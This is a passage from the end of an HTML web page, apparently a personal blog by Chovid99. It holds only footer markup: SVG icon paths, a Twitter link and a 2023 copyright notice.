C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
            </g>
        </g>
    </g>
</svg>
    </a>

    <a class="symbol" href="https://twitter.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
	 xml:space="preserve">
<g>
	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
</g>
</svg>

    </a>


</div>

    

    <div class="copyright">
    
       © Copyright 
       2023 
       <span class="split">
        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
</svg>
       </span>
       Chovid99
    
    </div>

    
</footer>



  </body>
</html>
